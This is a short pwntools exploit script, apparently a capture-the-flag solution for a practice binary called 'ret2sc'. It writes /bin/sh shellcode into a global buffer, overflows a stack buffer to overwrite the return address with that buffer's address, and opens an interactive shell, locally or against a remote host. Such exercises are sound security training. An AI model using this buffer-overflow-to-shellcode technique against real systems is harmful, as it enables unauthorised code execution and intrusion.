#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./ret2sc",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
else:
    con=code.process()

def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    con.sendafter("Name:",asm(shellcraft.sh()))#Write shellcode to bss
    payload = "a"*32+p64(code.symbols['name'])#Overwrite ret addr to shellcode
    con.sendlineafter("best:",payload)

exploit()
con.interactive()    
